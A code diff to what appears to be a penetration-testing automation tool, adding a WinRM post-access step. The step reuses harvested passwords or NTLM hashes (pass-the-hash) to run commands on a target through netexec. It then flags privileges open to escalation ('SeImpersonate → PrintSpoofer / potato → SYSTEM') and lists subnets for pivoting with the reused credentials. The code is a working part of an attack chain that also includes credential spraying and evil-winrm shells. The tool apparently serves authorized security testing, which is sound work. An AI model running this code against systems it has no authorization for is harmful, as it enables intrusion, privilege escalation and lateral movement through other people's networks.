@@ -2223,6 +2223,19 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"SMB readable shares: {len(files)} sensitive file(s)"[:140]}
         return None
 
+    # 2as) winrm-recon: post-access recon — hot privilege → privesc path; pivot subnets
+    if sid == "winrm-recon":
+        privs = re.findall(r"^✗ PRIV (\S+)", output, re.M)
+        if privs:
+            hot = any(p in _HOT_PRIVS for p in privs)
+            shown = ", ".join(privs[:5])
+            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH" if hot else "MEDIUM",
+                    "summary": f"WinRM privileges: {shown}"[:140]}
+        if "Networks:" in output:
+            return {"state": "INFO", "cve": cve, "risk": "LOW",
+                    "summary": "WinRM post-access recon (pivot surface)"[:140]}
+        return None
+
     # 2ar) winrm-access: enumerated who can use WinRM (Remote Management Users / admins)
     if sid == "winrm-access":
         hits = [h.replace("  (have cred)", "").strip()
@@ -3017,7 +3030,7 @@ _EXPLOIT_STEPS = {
         ("Validate & spray creds and NTLM hashes against known users (watch lockout)", "winrm-spray"),
         ("Valid creds or hash → interactive shell (evil-winrm; -H for pass-the-hash)", "winrm-shell"),
         ("Needs 'Remote Management Users' / admin membership — note who has access", "winrm-access"),
-        "Via the shell: enumerate, upload tooling, run commands; reuse creds to pivot",
+        ("Via the shell: enumerate, upload tooling, run commands; reuse creds to pivot", "winrm-recon"),
         # ── land a shell & foothold ──
         "Spawn & upgrade an interactive shell",
         # ── manual steps, tailored to what this host exposed ──
@@ -8533,11 +8546,12 @@ def _smb_run(cmd: list, timeout: int) -> "tuple[int, str]":
 
 
 def _nxc_body(out: str) -> str:
-    """Strip netexec's repeated 'SMB  <ip>  445  <HOST>  ' line prefix so the payload
-    (share table / user list / policy) reads cleanly; drop banner ([*]/[+]/[-]) lines."""
+    """Strip netexec's repeated '<PROTO>  <ip>  <port>  <HOST>  ' line prefix (SMB / WINRM /
+    LDAP …) so the payload (share table / user list / cmd output) reads cleanly; drop banner
+    ([*]/[+]/[-]) lines."""
     body = []
     for ln in out.splitlines():
-        m = re.match(r"^SMB\s+\S+\s+\d+\s+\S+\s+(.*)$", ln)
+        m = re.match(r"^[A-Z]+\s+\S+\s+\d+\s+\S+\s+(.*)$", ln)
         rest = m.group(1) if m else ln
         if rest.strip() and not rest.lstrip().startswith(("[*]", "[+]", "[-]", "[!]")):
             body.append(rest.rstrip())
@@ -10218,6 +10232,58 @@ def _tool_winrm_access(ip: str, port: int, proto: str) -> str:
     return f"WinRM access — {ip}\n\n" + "\n".join(head + lines)
 
 
+# ── WinRM step 5: post-access recon over the shell (privesc + pivot surface) ────
+_HOT_PRIVS = {"SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege", "SeDebugPrivilege",
+              "SeBackupPrivilege", "SeRestorePrivilege", "SeTakeOwnershipPrivilege",
+              "SeLoadDriverPrivilege", "SeManageVolumePrivilege", "SeTcbPrivilege"}
+
+
+def _tool_winrm_recon(ip: str, port: int, proto: str) -> str:
+    """WinRM step 5 tool: quick, non-interactive post-access recon over the WinRM channel using
+    a shell-capable cred (from winrm-spray) — runs read-only commands via netexec -x (whoami
+    /priv, ipconfig) to surface a privesc path (SeImpersonate → PrintSpoofer/potato → SYSTEM)
+    and the pivot surface (other subnets to reuse creds against). Deeper enumeration / uploading
+    tooling stays in the interactive shell (step 3/6). No root. Raises without a WinRM cred."""
+    nxc = shutil.which("netexec") or shutil.which("nxc")
+    if not nxc:
+        raise RuntimeError("netexec not found — install it for post-access recon")
+    creds = [c for c in _gather_winrm_creds() if c[0] == ip] or _gather_winrm_creds()
+    if not creds:
+        raise RuntimeError("no WinRM-capable cred — run winrm-spray (r2) first")
+    host, user, secret = creds[0]
+    is_hash = bool(re.fullmatch(r"[a-fA-F0-9]{32}", secret))
+    auth = ["-u", user] + (["-H", secret] if is_hash else ["-p", secret])
+
+    _, o1 = _smb_run([nxc, "winrm", host, *auth, "-x", "whoami & whoami /priv"], 90)
+    if not re.search(r"\b5985\b.*\[\+\]|\b5986\b.*\[\+\]|\[\+\]", o1):
+        raise RuntimeError(f"{host} — WinRM cred did not authenticate (rotated?)")
+    _, o2 = _smb_run([nxc, "winrm", host, *auth, "-x", "ipconfig"], 90)
+    b1, b2 = _nxc_body(o1), _nxc_body(o2)
+
+    ctx = next((ln.strip() for ln in b1.splitlines()
+                if re.match(r"^\S+\\\S+$", ln.strip()) or "system" in ln.lower()), "")
+    privs = []
+    for ln in b1.splitlines():
+        mm = re.search(r"(Se\w+Privilege)", ln)
+        if mm and "Enabled" in ln and mm.group(1) not in privs:
+            privs.append(mm.group(1))
+    subnets = list(dict.fromkeys(
+        f"{a}.0/24" for a in re.findall(r"(\d+\.\d+\.\d+)\.\d+", b2)
+        if not a.startswith(("127.", "169.254"))))
+
+    hot = [p for p in privs if p in _HOT_PRIVS]
+    lines = [f"[*] Context: {ctx or user}   (WinRM-capable cred)"]
+    for p in privs:
+        lines.append(f"✗ PRIV {p}" + ("  ⚑" if p in _HOT_PRIVS else ""))
+    if subnets:
+        lines.append(f"[*] Networks: {', '.join(subnets)}   (pivot surface)")
+    if hot:
+        lines.append(f"· {hot[0]} → PrintSpoofer / potato → SYSTEM")
+    if len(subnets) > 1:
+        lines.append("· pivot: reuse creds/hash across the other subnet(s) — re-run spray there")
+    return f"WinRM post-access recon — {host}\n\n" + "\n".join(lines)
+
+
 # tool key -> (short label shown in the checklist, runner(ip, port, proto) -> output str)
 _STEP_TOOLS = {
     "http-headers": ("HTTP headers (stdlib, no redirects)", _tool_http_headers),
@@ -10265,6 +10331,7 @@ _STEP_TOOLS = {
     "winrm-spray": ("Validate harvested creds/hashes against WinRM (netexec → shell)", _tool_winrm_spray),
     "winrm-shell": ("Interactive WinRM shell (evil-winrm, -S HTTPS, PtH)", _tool_winrm_shell),
     "winrm-access": ("Who can WinRM — Remote Management Users / admins (netexec)", _tool_winrm_access),
+    "winrm-recon": ("Post-access recon over WinRM (privesc path + pivot surface)", _tool_winrm_recon),
 }
 
 def _mins(seconds: int) -> str:
@@ -10327,6 +10394,7 @@ _STEP_TOOL_RUNS = {
     "winrm-spray":      ("netexec winrm", f"{_mins(_WINRMSPRAY_DEADLINE)} min"),
     "winrm-shell":      ("evil-winrm", None),
     "winrm-access":     ("netexec --local-group", None),
+    "winrm-recon":      ("netexec winrm -x", None),
 }
 
 
@@ -10488,6 +10556,9 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
         print(f"{YELLOW}   ⚠ SMB version-RCE scan{RESET}{DIM} — detection only (nmap NSE + netexec), "
               f"no exploitation / no unsafe probes · {RESET}{YELLOW}authorized targets only{RESET}"
               f"{DIM} · deadline {_SMBVULN_DEADLINE // 60} min{RESET}")
+    if tool_key == "winrm-recon":                 # read-only post-access recon over the channel
+        print(f"{DIM}   read-only recon over WinRM (whoami /priv, ipconfig) — privesc path "
+              f"(SeImpersonate → potato) + pivot subnets · deeper enum stays in the shell (r3){RESET}")
     if tool_key == "winrm-access":                # read-only group enum with a harvested cred
         print(f"{DIM}   enumerates Remote Management Users / Administrators via a harvested cred "
               f"(netexec --local-group over SMB 445) — read-only{RESET}")
